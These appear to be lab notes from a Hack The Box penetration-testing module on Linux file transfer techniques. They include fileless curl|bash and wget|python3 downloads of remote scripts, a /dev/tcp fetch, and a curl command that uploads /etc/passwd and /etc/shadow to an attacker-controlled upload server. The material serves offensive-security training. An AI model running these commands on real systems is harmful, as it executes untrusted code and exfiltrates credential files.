```
MarcosV999@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

```
MarcosV999@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

#### Fileless Download with cURL
```
MarcosV999@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

#### Fileless Download with wget
```
MarcosV999@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```

## Download with Bash (/dev/tcp)
#### Connect to the Target Webserver
```
MarcosV999@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```
#### HTTP GET Request
```
MarcosV999@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```
#### Print the Response
```
MarcosV999@htb[/htb]$ cat <&3
```
## SCP Upload
```bash
# Download File
MarcosV999@htb[/htb]$ scp -i <private-key> <username>@<ip-address>:<file-to-download> <path-to-store>

# Upload File:
MarcosV999@htb[/htb]$ scp -i <private-key> <file-to-transfer> <username>@<ip-address>:<path-to-store>
```
## Web Upload
```
MarcosV999@htb[/htb]$ sudo python3 -m pip install --user uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

```
MarcosV999@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
-----
```

```
MarcosV999@htb[/htb]$ mkdir https && cd https
```

```
MarcosV999@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

```
MarcosV999@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

## Alternative Web File Transfer Method
```
MarcosV999@htb[/htb]$ python3 -m http.server
MarcosV999@htb[/htb]$ python2.7 -m SimpleHTTPServer
MarcosV999@htb[/htb]$ php -S 0.0.0.0:8000
MarcosV999@htb[/htb]$ ruby -run -ehttpd . -p8000
MarcosV999@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt
```